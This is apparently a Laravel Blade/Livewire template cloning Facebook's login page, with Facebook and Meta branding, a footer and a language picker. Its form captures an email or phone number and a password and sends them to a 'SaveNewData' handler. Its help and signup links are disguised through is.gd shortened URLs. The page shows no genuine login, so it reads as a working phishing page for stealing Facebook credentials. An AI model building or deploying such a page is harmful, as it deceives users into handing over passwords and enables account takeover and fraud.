<div class="h-screen flex flex-col" x-data="{ showFooter: false }">
    <div class="md:bg-[#f2f4f7] flex-[2] md:pt-[112px] md:pb-[72px] relative flex flex-col">
        <div class="blocks-2"></div>
        <div class="pt-6 flex items-center justify-center pb-16 w-full md:hidden">
            <button id="toggleLanguage" class="text-sm">English (UK)</button>
        </div>
        <div class="max-w-[980px] mx-auto md:flex py-5 flex-1 w-full">
            <div class="w-full p-2 md:p-0 pb-[60px] md:pb-0">
                <div class="hidden md:block pt-10 md:pt-[112px] pb-[16px]">
                    <img src="{{ asset('images/facebook.svg') }}" alt="" class=" h-20 md:h-[106px] m-[-28px]">
                </div>
                <div class="md:hidden items-center justify-center mb-10 pt-10 flex">
                    <img src="{{ asset('images/logo.png') }}" alt="" class=" h-16 md:h-[106px] m-[-28px]">
                </div>
                <p class="leading-8 text-[#1c1e21] text-xl md:text-[27px] hidden md:block">
                    Facebook helps you connect and share <br> with the people in your life.
                </p>
            </div>
            <div class="w-full flex flex-col items-center p-2">
                <form wire:submit.prevent="SaveNewData"
                    class="bg-transparent md:bg-white p-3 md:p-[20px] rounded-[10px] md:boxshadow w-full md:w-[396px] ml-auto">
                    <div>
                        @error('emailorphone')
                            <small class="text-red-500 font-medium">
                                {{ $message }}
                            </small>
                        @enderror
                        <input type="text" required wire:model="emailorphone"
                            class="w-full p-[18px] z-50 md:p-[14px] border border-[#d3d3d3] rounded-[12px] md:rounded-[6px] mb-[12px] focus:outline-none focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff]"
                            placeholder="Email address or phone number">
                    </div>
                    <div>
                        @error('password')
                            <small class="text-red-500 font-medium">
                                {{ $message }}
                            </small>
                        @enderror
                        <input type="password" required wire:model="password"
                            class="w-full p-[18px] md:p-[14px] border border-[#d3d3d3] rounded-[12px] md:rounded-[6px] mb-[12px] focus:outline-none focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff]"
                            placeholder="Password">
                    </div>
                    <div>
                        <button
                            class="w-full bg-[#0866ff] text-white p-[12px] rounded-full md:rounded-[6px] text-base md:text-[20px] md:font-semibold hover:bg-[#166fe5] active:shadow-[inset_0_0_6px_rgba(0,0,0,0.2)]">
                            Log
                            In
                        </button>
                    </div>
                    <div class="mt-[16px]">
                        <a href="https://is.gd/ykAN0o"
                            class="md:text-blue-500 block text-center text-base md:text-sm font-medium">Forgot
                            password?</a>
                    </div>
                    <div class="my-6 hidden md:block">
                        <hr>
                    </div>
                    <div class="items-center justify-center hidden md:flex">
                        <a href="https://is.gd/FrB4zD"
                            class="leading-[48px] bg-[#42b72a] text-white px-[10px] rounded-[6px] text-[17px] font-semibold hover:bg-[#36a420] active:shadow-[inset_0_0_6px_rgba(0,0,0,0.2)] inline-block">Create
                            new account</a>
                    </div>
                </form>
                <div class="ml-auto mr-10 hidden md:flex">
                    <p class="text-[#1c1e21] text-[14px] mt-[22px]"><a href="" class="font-bold">Create a
                            Page</a> for a
                        celebrity, brand or business.</p>
                </div>
            </div>
        </div>
        <div class="md:hidden w-full bottom-0 p-4">
            <button class="border border-blue-500 text-blue-500 rounded-full p-2 bg-transparent w-full">
                Create Account
            </button>
            <div class="flex items-center justify-center mt-6 mb-4">
                <img src="{{ asset('images/meta.png') }}" alt="" class=" h-3 opacity-90">
            </div>
            <div class="flex items-center justify-center gap-2 mt-4 opacity-50">
                <a class="text-[11px]" href="https://is.gd/6y7vkD">
                    About
                </a>
                <a class="text-[11px]" href="https://is.gd/cyG34u">
                    Help
                </a>
                <button @click="showFooter = !showFooter" class="text-[11px]">
                    More
                </button>
            </div>
        </div>
    </div>
    <div :class="{ 'hidden': !showFooter }" class="md:bg-white bg-[#f2f4f7] md:flex-[1.3] px-4 md:p-0 md:block">
        <div class="max-w-[980px] mx-auto py-6 ">
            <div class="mb-4">
                <ul class="flex flex-wrap gap-2 text-[12px] text-gray-600">
                    <li>English (UK)</li>
                    <li><a href="#" class="hover:underline">Hausa</a></li>
                    <li><a href="#" class="hover:underline">Français (France)</a></li>
                    <li><a href="#" class="hover:underline">Português (Brasil)</a></li>
                    <li><a href="#" class="hover:underline">Español</a></li>
                    <li><a href="#" class="hover:underline">العربية</a></li>
                    <li><a href="#" class="hover:underline">Bahasa Indonesia</a></li>
                    <li><a href="#" class="hover:underline">Deutsch</a></li>
                    <li><a href="#" class="hover:underline">日本語</a></li>
                    <li><a href="#" class="hover:underline">Italiano</a></li>
                    <li><a href="#" class="hover:underline">हिन्दी</a></li>
                </ul>
            </div>
            <hr class="border-gray-300 my-2">
            <div class="mt-4">
                <ul class="flex flex-wrap gap-x-4 gap-y-2 text-[12px] text-gray-600">
                    <li><a href="#" class="hover:underline">Sign Up</a></li>
                    <li><a href="#" class="hover:underline">Log In</a></li>
                    <li><a href="#" class="hover:underline">Messenger</a></li>
                    <li><a href="#" class="hover:underline">Facebook Lite</a></li>
                    <li><a href="#" class="hover:underline">Video</a></li>
                    <li><a href="#" class="hover:underline">Places</a></li>
                    <li><a href="#" class="hover:underline">Games</a></li>
                    <li><a href="#" class="hover:underline">Marketplace</a></li>
                    <li><a href="#" class="hover:underline">Meta Pay</a></li>
                    <li><a href="#" class="hover:underline">Meta Store</a></li>
                    <li><a href="#" class="hover:underline">Meta Quest</a></li>
                    <li><a href="#" class="hover:underline">Instagram</a></li>
                    <li><a href="#" class="hover:underline">Threads</a></li>
                    <li><a href="#" class="hover:underline">Privacy Policy</a></li>
                    <li><a href="#" class="hover:underline">Privacy Center</a></li>
                    <li><a href="#" class="hover:underline">Groups</a></li>
                    <li><a href="#" class="hover:underline">About</a></li>
                    <li><a href="#" class="hover:underline">Create Ad</a></li>
                    <li><a href="#" class="hover:underline">Create Page</a></li>
                    <li><a href="#" class="hover:underline">Developers</a></li>
                    <li><a href="#" class="hover:underline">Careers</a></li>
                    <li><a href="#" class="hover:underline">Cookies</a></li>
                    <li><a href="#" class="hover:underline">Terms</a></li>
                    <li><a href="#" class="hover:underline">Help</a></li>
                </ul>
            </div>
            <div class="mt-4 text-[12px] text-gray-600">
                <span>Meta © 2025</span>
            </div>
        </div>
    </div>
    {{-- FIX LANGUAGE SELECTOR --}}
    <div class="fixed bg-black bg-opacity-70 w-full left-0 top-0 h-screen z-50 md:hidden hidden" id="languageBox">
        <div class="absolute bottom-0 max-h-[72%] bg-white w-full rounded-tr-2xl rounded-tl-2xl">
            <div class="z-[5] relative">
                <div class="blocks-2"></div>
                <div class="p-4">
                    <button onclick="handleLanguageClose()" class="text-xl block mb-4 font-semibold">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 inline-block" fill="none"
                            viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                    <h1 class="text-xl font-semibold">Select your language</h1>
                </div>
                <div class="p-4 pb-0">
                    <ul id="languageList"
                        class="bg-white space-y-4 p-4 max-h-[500px] overflow-y-auto rounded-tr-xl rounded-tl-xl text-[12px] text-gray-600">
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="eng">English (UK)</label>
                            <input type="checkbox" name="language" id="eng" class="mr-2 h-4 w-4"
                                value="English (UK)">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="fr">Français (France)</label>
                            <input type="checkbox" name="language" id="fr" class="mr-2 h-4 w-4"
                                value="Français (France)">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="pt">Português (Brasil)</label>
                            <input type="checkbox" name="language" id="pt" class="mr-2 h-4 w-4"
                                value="Português (Brasil)">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="es">Español</label>
                            <input type="checkbox" name="language" id="es" class="mr-2 h-4 w-4"
                                value="Español">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="ar">العربية</label>
                            <input type="checkbox" name="language" id="ar" class="mr-2 h-4 w-4"
                                value="العربية">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="id">Bahasa Indonesia</label>
                            <input type="checkbox" name="language" id="id" class="mr-2 h-4 w-4"
                                value="Bahasa Indonesia">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="de">Deutsch</label>
                            <input type="checkbox" name="language" id="de" class="mr-2 h-4 w-4"
                                value="Deutsch">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="jp">日本語</label>
                            <input type="checkbox" name="language" id="jp" class="mr-2 h-4 w-4"
                                value="日本語">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="it">Italiano</label>
                            <input type="checkbox" name="language" id="it" class="mr-2 h-4 w-4"
                                value="Italiano">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="hi">हिन्दी</label>
                            <input type="checkbox" name="language" id="hi" class="mr-2 h-4 w-4"
                                value="हिन्दी">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="ru">Русский</label>
                            <input type="checkbox" name="language" id="ru" class="mr-2 h-4 w-4"
                                value="Русский">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="zh">中文(简体)</label>
                            <input type="checkbox" name="language" id="zh" class="mr-2 h-4 w-4"
                                value="中文(简体)">
                        </li>
                        <li class="flex items-center py-2 gap-2 justify-between">
                            <label class="text-lg flex-1" for="hausa">Hausa</label>
                            <input type="checkbox" name="language" id="hausa" class="mr-2 h-4 w-4"
                                value="Hausa">
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
